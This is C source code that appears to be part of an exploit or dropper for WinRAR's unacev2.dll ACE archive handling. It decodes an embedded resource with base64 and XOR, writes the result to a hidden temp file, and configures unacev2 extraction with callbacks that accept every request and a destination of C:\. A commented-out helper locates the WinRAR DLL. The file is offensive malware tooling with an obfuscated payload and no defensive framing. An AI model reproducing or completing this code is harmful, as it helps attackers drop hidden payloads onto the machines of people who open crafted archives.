#include <Windows.h>

#include "Headers/ace.h"
#include "Headers/tools.h"
#include "Headers/resource.h"


CHAR m_CommentBuf[8192];
CHAR tmpFile[MAX_PATH];

int __stdcall InfoProc(pACEInfoCallbackProcStruc Info)
{
	return ACE_CALLBACK_RETURN_OK;
}

int __stdcall StateProc(pACEStateCallbackProcStruc State)
{
	return ACE_CALLBACK_RETURN_OK;
}

int __stdcall RequestProc(pACERequestCallbackProcStruc Request)
{
	return ACE_CALLBACK_RETURN_OK;
}

int __stdcall ErrorProc(pACEErrorCallbackProcStruc Error)
{
	return ACE_CALLBACK_RETURN_CANCEL;
}

VOID DropAceResource(HMODULE hModule) { // Checks omitted

	HANDLE hHandle = NULL;
	BYTE * decAddr = NULL;
	resStruc resource = {};
	DWORD bytesWritten = NULL;
	decryptedDataStruc decryptData = {};

	strcat_s(tmpFile, szTmpPath);
	strcat_s(tmpFile, TMP_FILE);

	resource = GetResource(hModule, IDR_RCDATA2);
	decAddr = DecryptBase64(&decryptData, resource.resAddress, resource.resSize);
	decryptData.decryptedData = XorBytes(decAddr, decryptData.sizeData, XOR_ACE_KEY);

	if (decryptData.decryptedData && decryptData.sizeData) {
		hHandle = CreateFile(tmpFile, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN, NULL);
		WriteFile(hHandle, decryptData.decryptedData, decryptData.sizeData, &bytesWritten, NULL);
		CloseHandle(hHandle);
	}
	HeapFree(GetProcessHeap(), 0, decAddr);
	HeapFree(GetProcessHeap(), 0, decryptData.decryptedData);
}

VOID FillInitStruct(pACEInitDllStruc initStruct) {

	tACEGlobalDataStruc globalStruct = {};

	globalStruct.MaxArchiveTestBytes = 0x2ffFF;
	globalStruct.MaxFileBufSize = 0x2ffFF;
	globalStruct.Comment.BufSize = sizeof(m_CommentBuf);
	globalStruct.Comment.Buf = m_CommentBuf;
	globalStruct.TempDir = szTmpPath;

	globalStruct.InfoCallbackProc = InfoProc;
	globalStruct.ErrorCallbackProc = ErrorProc;
	globalStruct.RequestCallbackProc = RequestProc;
	globalStruct.StateCallbackProc = StateProc;

	initStruct->GlobalData = globalStruct;
}

VOID FillExtractStruct(pACEExtractStruc extractStruct) {

	tACEFilesStruc files = {};
	LPSTR sourceDir = (char *) "C:\\";

	files.SourceDir = sourceDir;
	files.RecurseSubDirs = TRUE;
	extractStruct->Files = files;
	extractStruct->DestinationDir = sourceDir;
}

/*
LPCSTR GetUnaceDllPath() {

	SYSTEM_INFO sysInfo = {};
	LPCSTR pathToUnacev2 = NULL;

	GetNativeSystemInfo(&sysInfo);

	if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) { // Forget ARM
		pathToUnacev2 = "C:\\Program Files (x86)\\WinRAR\\unacev2.dll";
	}
	else {
		pathToUnacev2 = "C:\\Program Files\\WinRAR\\unacev2.dll";
	}

	return pathToUnacev2;
}
*/